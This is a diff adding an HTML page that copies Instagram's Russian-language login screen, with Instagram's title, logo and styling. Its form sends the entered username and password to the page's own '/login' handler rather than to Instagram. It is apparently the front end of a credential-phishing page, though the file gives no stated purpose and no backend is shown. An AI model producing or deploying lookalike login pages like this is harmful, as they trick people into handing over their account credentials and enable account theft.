@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Instagram</title>
+  <style>
+    body {
+      margin: 0;
+      background: #fafafa;
+      font-family: 'Segoe UI', Roboto, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      width: 100%;
+      max-width: 350px;
+      padding: 40px 30px;
+      text-align: center;
+      box-shadow: 0 0 8px rgba(0, 0, 0, 0.05);
+    }
+
+    .logo img {
+      width: 175px;
+      margin-bottom: 30px;
+    }
+
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 5px;
+      padding: 10px;
+      margin-bottom: 10px;
+      font-size: 14px;
+      outline: none;
+    }
+
+    input[type="submit"] {
+      background: #3897f0;
+      color: white;
+      border: none;
+      padding: 10px;
+      font-weight: bold;
+      border-radius: 5px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    .or-divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+      color: #999;
+      font-size: 13px;
+    }
+
+    .or-divider::before,
+    .or-divider::after {
+      content: '';
+      flex: 1;
+      border-bottom: 1px solid #dbdbdb;
+    }
+
+    .or-divider:not(:empty)::before {
+      margin-right: .75em;
+    }
+
+    .or-divider:not(:empty)::after {
+      margin-left: .75em;
+    }
+
+    .forgot-password {
+      font-size: 12px;
+      color: #385185;
+      margin-top: 15px;
+      text-decoration: none;
+    }
+
+    @media (max-width: 400px) {
+      .container {
+        border: none;
+        box-shadow: none;
+        padding: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram">
+    </div>
+    <form action="/login" method="post">
+      <input type="text" name="username" placeholder="Телефон, имя пользователя или эл. адрес" required />
+      <input type="password" name="password" placeholder="Пароль" required />
+      <input type="submit" value="Войти" />
+    </form>
+    <div class="or-divider">ИЛИ</div>
+    <a class="forgot-password" href="#">Забыли пароль?</a>
+  </div>
+</body>
+</html>
